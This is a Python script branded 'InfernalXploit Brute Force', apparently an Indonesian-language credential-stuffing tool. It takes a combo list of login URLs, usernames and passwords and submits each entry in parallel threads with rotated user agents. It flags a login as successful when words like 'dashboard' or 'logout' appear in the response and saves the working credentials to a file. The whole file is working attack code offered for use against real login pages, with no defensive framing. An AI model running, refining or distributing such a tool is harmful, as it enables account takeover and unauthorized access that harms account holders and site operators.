import os
import random
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

# ===== Warna =====
RED = "\033[31m"
CYAN = "\033[36m"
WHITE = "\033[37m"
RESET = "\033[0m"

def clear():
    os.system("cls" if os.name == "nt" else "clear")

def banner():
    clear()
    logo = f"""
{RED}██{CYAN}╗███{RED}╗   ██{CYAN}╗███████{RED}╗██████{CYAN}╗ ███{RED}╗   ██{CYAN}╗ █████{RED}╗ ██{CYAN}╗     ██{RED}╗ ██████{CYAN}╗ ██{RED}╗████████{CYAN}╗
{RED}██{CYAN}║████{RED}╗  ██{CYAN}║██{RED}╔════╝██{CYAN}╔══██{RED}╗████{CYAN}╗  ██{RED}║██{CYAN}╔══██{RED}╗██{CYAN}║     ██{RED}║██{CYAN}╔═══██{RED}╗██{CYAN}║╚══██{RED}╔══╝
{RED}██{CYAN}║██{RED}╔██{CYAN}╗ ██{RED}║█████{CYAN}╗  ██████{RED}╔╝██{CYAN}╔██{RED}╗ ██{CYAN}║███████{RED}║██{CYAN}║     ██{RED}║██{CYAN}║   ██{RED}║██{CYAN}║   ██{RED}║   
{RED}██{CYAN}║██{RED}║╚██{CYAN}╗██{RED}║██{CYAN}╔══╝  ██{RED}╔══██{CYAN}╗██{RED}║╚██{CYAN}╗██{RED}║██{CYAN}╔══██{RED}║██{CYAN}║     ██{RED}║██{CYAN}║   ██{RED}║██{CYAN}║   ██{RED}║   
{RED}██{CYAN}║██{RED}║ ╚████{CYAN}║██{RED}║     ██{CYAN}║  ██{RED}║██{CYAN}║ ╚████{RED}║██{CYAN}║  ██{RED}║███████{CYAN}╗██{RED}║╚██████{CYAN}╔╝██{RED}║   ██{CYAN}║   
╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝   ╚═╝   
    """
    print(logo)
    print(f"{CYAN}[ {WHITE}InfernalXploit Brute Force Fatal X Brutal {CYAN}]")
    print(f"{CYAN}[ {WHITE}Format : URL|USER|PASS ]")
    print(f"{CYAN}====================================================={RESET}\n")

def load_user_agents():
    with open("useragents.txt", "r") as f:
        return [ua.strip() for ua in f.readlines() if ua.strip()]

def check_login(login_url, usr, pw, user_agents):
    try:
        session = requests.Session()
        headers = {
            "User-Agent": random.choice(user_agents),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive"
        }

        data = {
            "username": usr,
            "password": pw
        }

        r = session.post(login_url, data=data, headers=headers, timeout=15)

        if any(key in r.text.lower() for key in ["dashboard", "welcome", "logout"]):
            print(f"{CYAN}[VALID]{WHITE} {login_url} | {usr} | {pw}")
            with open("validd.txt", "a") as f:
                f.write(f"{login_url}|{usr}|{pw}\n")
        else:
            print(f"{RED}[INVALID]{WHITE} {login_url} | {usr} | {pw}")
            with open("invalid.txt", "a") as f:
                f.write(f"{login_url}|{usr}|{pw}\n")
    except Exception as e:
        print(f"{RED}[ERROR]{WHITE} {login_url} -> {e}")

def main():
    banner()
    user_agents = load_user_agents()

    input_file = input(f"{CYAN}[?]{WHITE} Masukkan nama file list combo: ").strip()
    if not os.path.exists(input_file):
        print(f"{RED}[!]{WHITE} File '{input_file}' tidak ditemukan!")
        return

    try:
        threads = int(input(f"{CYAN}[?]{WHITE} Jumlah threads (max 30): "))
    except ValueError:
        threads = 10
    if threads > 30:
        threads = 30
    if threads < 1:
        threads = 1

    with open(input_file, "r") as f:
        lines = [l.strip() for l in f if l.strip() and not l.startswith("#")]

    total = len(lines)
    print(f"{CYAN}[+]{WHITE} Total target: {total}\n")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for count, line in enumerate(lines, start=1):
            print(f"{CYAN}[ {count}/{total} ]{WHITE} Checking...")
            parts = line.split("|")
            if len(parts) == 3:
                login_url, usr, pw = parts
                futures.append(executor.submit(check_login, login_url, usr, pw, user_agents))

        for future in as_completed(futures):
            pass

if __name__ == "__main__":
    main()
